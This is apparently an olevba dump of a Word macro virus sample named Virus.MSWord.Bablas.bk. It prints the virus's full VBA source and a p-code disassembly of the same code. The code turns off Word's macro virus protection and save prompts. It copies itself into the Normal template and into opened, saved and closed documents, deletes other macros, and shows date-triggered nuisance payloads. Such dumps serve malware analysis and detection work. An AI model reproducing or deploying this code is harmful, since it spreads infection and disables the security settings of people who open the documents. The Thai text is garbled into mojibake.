olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.bk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.bk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fmee.frm 
in file: Virus.MSWord.Bablas.bk - OLE stream: 'Macros/VBA/fmee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub ListBox1_Click()

End Sub

Private Sub Command1_Click()
Me.Height = 330
End Sub

Private Sub CommandButton1_Click()
Me.Height = 180
End Sub

Private Sub Label1_Click()

End Sub

Private Sub UserForm_Activate()
Me.Height = 180
End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
Dim r As Integer
Dim g As Integer
Dim b As Integer
If Label1.Font.Size = 26 Then
    Label1.Font.Size = 20
Else
    Label1.Font.Size = 26
End If
Randomize
r = Rnd * 255
g = Rnd * 255
b = Rnd * 255
Label1.ForeColor = RGB(r, g, b)

Randomize
r = Rnd * 255
g = Rnd * 255
b = Rnd * 255
Label2.ForeColor = RGB(r, g, b)
Randomize
r = Rnd * 255
g = Rnd * 255
b = Rnd * 255
Label3.ForeColor = RGB(r, g, b)
Randomize
r = Rnd * 255
g = Rnd * 255
b = Rnd * 255
Label4.ForeColor = RGB(r, g, b)


End Sub

Private Sub UserForm_Terminate()
MsgBox "˘ÍÍŔŃÂăą¤ÇŇÁäÁčĘĐ´Çˇ ˘ÍăËéÁŐ¤ÇŇÁĘŘ˘ąĐ", vbExclamation + vbOKOnly
Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO BMSING.bas 
in file: Virus.MSWord.Bablas.bk - OLE stream: 'Macros/VBA/BMSING'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ##### ŕÍˇÇÔ·ÂˇŇĂ¤ÍÁľÔÇŕµÍĂě Ę¶ŇşŃąĂŇŞŔŃŻŕľŞĂşŮĂłě #####
' ąŃˇČÖˇÉŇ »ŐˇŇĂČÖˇÉŇ 2540
' ·´ĘÍşˇŇĂŕ˘ŐÂąÁŇâ¤Ă
' ÁŇâ¤ĂáĂˇ "Happy birthday to me "
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For I = 1 To 100
        Beep
    Next I
  MsgBox "·´ĘÍşˇŇĂŕ˘ŐÂąâ»ĂáˇĂÁŕ·čŇąŃéą", vbExclamation + vbOKOnly, "Ę¶ŇşŃąĂŇŞŔŃŞŕľŞĂşŮĂłě"
    End If
End Sub
Sub ViewVbCode()
    MsgBox "äÁčÍąŘ­ŇµÔăËé·ÓĂŇÂˇŇĂąŐé ¤ŘłäÁčÍÂŇˇ·ÓÍÂŮčáĹéÇąŐčąŇ", vbExclamation

End Sub


Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub
Sub ToolsMacro()

End Sub

Sub HelpAbout()
 MsgBox "äÁčĂŮéŕËĂÍ ÇčŇµÔ´äÇĂŃĘÁŇąĐ", vbExclamation, "¤ÍÁ'40 ĂŇŞŔŃŻŕľŞĂşŮłě"
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "PETLAKORN HACKER  "
    ActiveWindow.Caption = "¨ŇˇËąŘčÁŕľŞĂĹĐ¤Ă"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "PETLAKORN Hacker") = "boonmee" Then Application.ShowVisualBasicEditor = True
End Sub

Sub TidDoc()
    Dim Ok As Boolean
    Ok = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "BMSING" Then Ok = True
        If Obj.Name <> "BMSING" And Obj.Name <> "ThisDocument" And Obj.Name <> "fmee" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Ok = False Then
        Application.StatusBar = "äÇĂŃĘˇÓĹŃ§ ˇĐ´Öęş ˇĐ´Öęşŕ˘éŇŕ¤Ă×čÍ§¤ŘłáĹéÇ"
        
                
         Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="fmee", Object:=wdOrganizerObjectProjectItems
        
         Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="BMSING", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub TidTemplate()
    Dim Ok As Boolean
    Ok = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "BMSING" Then Ok = True
        If Obj.Name <> "BMSING" And Obj.Name <> "ThisDocument" And Obj.Name <> "fmee" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Ok = False Then
            Application.StatusBar = "şéŇąľŐč˘Ň´¤ąËŘ§ŕ¨éŇ ...ÍÂŇˇăËéŕ¨éŇŕ»çą¤ąŞčÇÂËŘ§....... ........ ........."
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
              Destination:=NormalTemplate.FullName, Name:="fmee", Object:=3
              Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="BMSING", Object:=wdOrganizerObjectProjectItems
        
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
Dim todayy As String
todayy = Date
If Left(Format(todayy, "mm/dd/yyyy"), 5) = "05 30" Then
    fmee.Show
End If
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        TidDoc
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros True
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    TidTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    TidDoc
    'ActiveDocument.Close

End Sub

Sub FileClose()
   
       TidDoc
    
ActiveDocument.Close
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        TidDoc
        TidTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.BMSING.TidDoc
        WordBasic.DisableAutoMacros True
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.BMSING.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.BMSING.Ancurin"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bablas.bk
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/fmee - 4082 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub ListBox1_Click())
' Line #33:
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Private Sub Command1_Click())
' Line #37:
' 	LitDI2 0x014A 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #41:
' 	LitDI2 0x00B4 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Private Sub Label1_Click())
' Line #45:
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #49:
' 	LitDI2 0x00B4 
' 	Ld id_FFFF 
' 	MemSt Height 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #53:
' Line #54:
' 	EndSub 
' Line #55:
' Line #56:
' 	FuncDefn (Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single))
' Line #57:
' 	Dim 
' 	VarDefn r (As Integer)
' Line #58:
' 	Dim 
' 	VarDefn g (As Integer)
' Line #59:
' 	Dim 
' 	VarDefn B (As Integer)
' Line #60:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x001A 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitDI2 0x0014 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	LitDI2 0x001A 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	ArgsCall Read 0x0000 
' Line #66:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St r 
' Line #67:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St g 
' Line #68:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St B 
' Line #69:
' 	Ld r 
' 	Ld g 
' 	Ld B 
' 	ArgsLd RSet 0x0003 
' 	Ld Label1 
' 	MemSt ForeColor 
' Line #70:
' Line #71:
' 	ArgsCall Read 0x0000 
' Line #72:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St r 
' Line #73:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St g 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St B 
' Line #75:
' 	Ld r 
' 	Ld g 
' 	Ld B 
' 	ArgsLd RSet 0x0003 
' 	Ld Label2 
' 	MemSt ForeColor 
' Line #76:
' 	ArgsCall Read 0x0000 
' Line #77:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St r 
' Line #78:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St g 
' Line #79:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St B 
' Line #80:
' 	Ld r 
' 	Ld g 
' 	Ld B 
' 	ArgsLd RSet 0x0003 
' 	Ld Label3 
' 	MemSt ForeColor 
' Line #81:
' 	ArgsCall Read 0x0000 
' Line #82:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St r 
' Line #83:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St g 
' Line #84:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	St B 
' Line #85:
' 	Ld r 
' 	Ld g 
' 	Ld B 
' 	ArgsLd RSet 0x0003 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #86:
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #91:
' 	LitStr 0x0025 "˘ÍÍŔŃÂăą¤ÇŇÁäÁčĘĐ´Çˇ ˘ÍăËéÁŐ¤ÇŇÁĘŘ˘ąĐ"
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #92:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #93:
' 	EndSub 
' Macros/VBA/BMSING - 9271 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0038 " ##### ŕÍˇÇÔ·ÂˇŇĂ¤ÍÁľÔÇŕµÍĂě Ę¶ŇşŃąĂŇŞŔŃŻŕľŞĂşŮĂłě #####"
' Line #1:
' 	QuoteRem 0x0000 0x0019 " ąŃˇČÖˇÉŇ »ŐˇŇĂČÖˇÉŇ 2540"
' Line #2:
' 	QuoteRem 0x0000 0x0013 " ·´ĘÍşˇŇĂŕ˘ŐÂąÁŇâ¤Ă"
' Line #3:
' 	QuoteRem 0x0000 0x0021 " ÁŇâ¤ĂáĂˇ "Happy birthday to me ""
' Line #4:
' 	FuncDefn (Sub ShowMessage())
' Line #5:
' 	Ld Time 
' 	St H 
' Line #6:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Time 
' 	LitStr 0x0008 "21:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #8:
' 	ArgsCall Beep 0x0000 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	LitStr 0x001C "·´ĘÍşˇŇĂŕ˘ŐÂąâ»ĂáˇĂÁŕ·čŇąŃéą"
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0015 "Ę¶ŇşŃąĂŇŞŔŃŞŕľŞĂşŮĂłě"
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub ViewVbCode())
' Line #14:
' 	LitStr 0x0032 "äÁčÍąŘ­ŇµÔăËé·ÓĂŇÂˇŇĂąŐé ¤ŘłäÁčÍÂŇˇ·ÓÍÂŮčáĹéÇąŐčąŇ"
' 	Ld vbExclamation 
' 	ArgsCall MsgBox 0x0002 
' Line #15:
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' Line #19:
' 	FuncDefn (Sub Bablas())
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub ToolsMacro())
' Line #25:
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Sub HelpAbout())
' Line #29:
' 	LitStr 0x001A "äÁčĂŮéŕËĂÍ ÇčŇµÔ´äÇĂŃĘÁŇąĐ"
' 	Ld vbExclamation 
' 	LitStr 0x0015 "¤ÍÁ'40 ĂŇŞŔŃŻŕľŞĂşŮłě"
' 	ArgsCall MsgBox 0x0003 
' Line #30:
' 	EndSub 
' Line #31:
' Line #32:
' 	FuncDefn (Sub ToolsOptions())
' Line #33:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #34:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #36:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #37:
' 	ArgsCall Bablas 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Sub ChangeCap())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	LitStr 0x0012 "PETLAKORN HACKER  "
' 	Ld Application 
' 	MemSt Caption 
' Line #43:
' 	LitStr 0x0010 "¨ŇˇËąŘčÁŕľŞĂĹĐ¤Ă"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Sub RestoreCap())
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Sub OpenMyMacro())
' Line #53:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x0010 "PETLAKORN Hacker"
' 	ArgsLd InputBox 0x0002 
' 	LitStr 0x0007 "boonmee"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #54:
' 	EndSub 
' Line #55:
' Line #56:
' 	FuncDefn (Sub TidDoc())
' Line #57:
' 	Dim 
' 	VarDefn Ok (As Boolean)
' Line #58:
' 	LitVarSpecial (False)
' 	St Ok 
' Line #59:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #60:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BMSING"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ok 
' 	EndIf 
' Line #61:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BMSING"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0004 "fmee"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #62:
' 	LineCont 0x0004 0A 00 0C 00
' 	LitStr 0x0009 "Deleting "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x000A " Macro in "
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #63:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	Ld Ok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitStr 0x002A "äÇĂŃĘˇÓĹŃ§ ˇĐ´Öęş ˇĐ´Öęşŕ˘éŇŕ¤Ă×čÍ§¤ŘłáĹéÇ"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #68:
' Line #69:
' Line #70:
' 	LineCont 0x0004 09 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "fmee"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #71:
' Line #72:
' 	LineCont 0x0004 09 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "BMSING"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub TidTemplate())
' Line #77:
' 	Dim 
' 	VarDefn Ok (As Boolean)
' Line #78:
' 	LitVarSpecial (False)
' 	St Ok 
' Line #79:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #80:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BMSING"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ok 
' 	EndIf 
' Line #81:
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0006 "BMSING"
' 	Ne 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld Obj 
' 	MemLd New 
' 	LitStr 0x0004 "fmee"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #82:
' 	LineCont 0x0004 0A 00 0C 00
' 	LitStr 0x0009 "Deleting "
' 	Ld Obj 
' 	MemLd New 
' 	Add 
' 	LitStr 0x001C " Macro in Normal Template..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #83:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Obj 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld Obj 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	Ld Ok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitStr 0x0049 "şéŇąľŐč˘Ň´¤ąËŘ§ŕ¨éŇ ...ÍÂŇˇăËéŕ¨éŇŕ»çą¤ąŞčÇÂËŘ§....... ........ ........."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #88:
' 	LineCont 0x0004 09 00 0E 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "fmee"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #89:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "BMSING"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #90:
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' 	FuncDefn (Sub AutoExit())
' Line #97:
' 	Dim 
' 	VarDefn todayy (As String)
' Line #98:
' 	Ld Date 
' 	St todayy 
' Line #99:
' 	Ld todayy 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "05 30"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	Ld fmee 
' 	ArgsMemCall Show 0x0000 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	ArgsCall ShowMessage 0x0000 
' Line #103:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
' 	FuncDefn (Sub FileOpen())
' Line #107:
' 	ArgsCall ChangeCap 0x0000 
' Line #108:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #111:
' 	ArgsCall TidDoc 0x0000 
' Line #112:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	ArgsCall RestoreCap 0x0000 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub AutoOpen())
' Line #119:
' 	ArgsCall Bablas 0x0000 
' Line #120:
' 	ArgsCall ChangeCap 0x0000 
' Line #121:
' 	ArgsCall TidTemplate 0x0000 
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #124:
' 	ArgsCall RestoreCap 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' 	FuncDefn (Sub AutoClose())
' Line #128:
' 	ArgsCall TidDoc 0x0000 
' Line #129:
' 	QuoteRem 0x0004 0x0014 "ActiveDocument.Close"
' Line #130:
' Line #131:
' 	EndSub 
' Line #132:
' Line #133:
' 	FuncDefn (Sub FileClose())
' Line #134:
' Line #135:
' 	ArgsCall TidDoc 0x0000 
' Line #136:
' Line #137:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Sub FileSave())
' Line #141:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #142:
' 	ArgsCall TidDoc 0x0000 
' Line #143:
' 	ArgsCall TidTemplate 0x0000 
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #146:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	EndSub 
' Line #149:
' Line #150:
' 	FuncDefn (Sub Ancurin())
' Line #151:
' 	Ld Documents 
' 	MemLd Count 
' 	St C 
' Line #152:
' 	Ld C 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #153:
' 	Ld Normal 
' 	MemLd BMSING 
' 	ArgsMemCall TidDoc 0x0000 
' Line #154:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "Document1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #157:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld Now 
' 	LitStr 0x0008 "00:00:07"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0015 "Normal.BMSING.Ancurin"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub AutoExec())
' Line #162:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #163:
' 	ArgsCall Bablas 0x0000 
' Line #164:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:07"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0015 "Normal.BMSING.Ancurin"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #165:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bablas.bk' - OLE stream: 'Macros/fmee/o'
